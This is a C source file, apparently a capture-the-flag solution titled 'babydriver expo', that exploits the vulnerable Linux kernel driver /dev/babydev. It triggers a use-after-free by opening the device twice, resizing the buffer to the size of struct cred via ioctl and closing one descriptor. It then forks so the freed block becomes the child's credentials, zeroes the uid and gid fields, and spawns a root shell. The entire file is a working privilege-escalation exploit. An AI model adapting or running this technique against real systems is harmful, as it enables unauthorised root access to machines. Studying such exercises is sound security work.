/**********************************************************************
 * babydriver expo
 * by fr33bug
 *********************************************************************/
 
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>

#define CREDSIZE	0xA8
#define DEV 		"/dev/babydev"

int main ()
{
	pid_t pid;
	int fd[2] = {-1};
	
	/* Open the device two times, so that we can still visit the memory block if one fd is closed */
	fd[0] = open (DEV, O_RDWR);
	if (fd[0] < 0)
	{
		printf ("Error : Fail to open babydev for the first time\n");
		exit (-1);
	}
	
	fd[1] = open (DEV, O_RDWR);
	if (fd[1] < 0)
	{
		printf ("Error : Fail to open babydev for the second time\n");
		close (fd[0]);
		exit (-1);
	}	
	
	/* Set buffer size to sizeof(struct cred) and reallocate the memory */
	if (ioctl (fd[1], 0x10001, 0xA8) < 0)
	{
		printf ("Error : Fail to set buffer size through ioctl()\n");
		close (fd[0]);
		close (fd[1]);
		exit (-1);
	}
	
	/* Close one of the two fds, so at this time, the buffer is freed. */
	close (fd[0]); 
	
	/* Then fork a new process, the memory block that we just free is allocate as a cred */
	if ((pid = fork()) < 0)
	{
		printf ("Error : Fail to set buffer size through ioctl()\n");
	}
	else if (pid == 0) /* This is child process */
	{
		int payload[7] = {0}; /*set the following memebers to zero: usage, uid, gid, suid, sgid, euid, egid*/
		write (fd[1], payload, sizeof (payload));
		if (getuid() == 0)
		{
			system ("/bin/sh");
			exit (0);
		}
	}
	else /* This is parent process */
	{
		wait (NULL);
	}
	
	close (fd[1]);
	
	return 0;
}
